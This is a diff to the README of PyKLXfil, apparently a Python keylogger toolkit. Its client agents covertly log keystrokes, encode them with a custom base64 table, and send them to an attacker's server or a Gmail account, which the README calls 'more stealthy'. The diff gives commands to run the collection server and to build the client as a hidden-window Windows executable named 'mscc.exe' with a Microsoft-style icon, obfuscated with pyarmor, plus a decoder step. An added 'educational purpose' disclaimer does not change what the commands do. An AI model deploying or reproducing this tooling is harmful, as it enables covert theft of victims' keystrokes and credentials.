@@ -4,6 +4,7 @@
 * PyKLXfil-Client: the agent that will perform the encoded key logging with a custome base64 table and the exfiltration of data back to PyKLXfil-Server.
 * PyKLXfil-Client-mail: a standalone agent that will perform encoded key logging with a custome base64 table and exfiltration to a gmail email account (more stealthy).
 * PyKLXfil-Decoder: a tool to decode the key logs.
+## Disclaimer: For educational purpose, use at your own responsibility.
 ## Install:
 ```sh
   git clone https://github.com/iD4rksid3/PyKLXfil.git
@@ -35,9 +36,6 @@ python3 PyKLXfil-Server.py 0.0.0.0 443 &
 ```sh
 pyinstaller --onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 -n mscc.exe PyKLXfil-Client.py
 ```
-* After recieving the encoded log files, PyKLXfil-Decoder.py can be used to decode them:
-```sh
-python3 PyKLXfil-Decoder.py xxx
 ### Key logging and exfiltration using gmail (more stealthy):
 * Compile and obfuscate the python gmail client for a windows machine (stand alone):
 * Note: you will first need to get app password token to be used in the script, a good guide can be found [here](https://towardsdatascience.com/automate-sending-emails-with-gmail-in-python-449cc0c3c317)
@@ -54,3 +52,11 @@ nano PyKLXfil-Client-mail.py
  pip3 install pyinstaller
  pyarmor pack --clean -e "--onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32" PyKLXfil-Client-mail.py -n mscc.exe
  ```
+ * After recieving the encoded log files, PyKLXfil-Decoder.py can be used to decode them:
+```sh
+python3 PyKLXfil-Decoder.py xxxx.log
+#will result in a decoded file Decoded-xxxx.log
+
+## License
+
+Distributed under the MIT License. See `LICENSE` for more information.
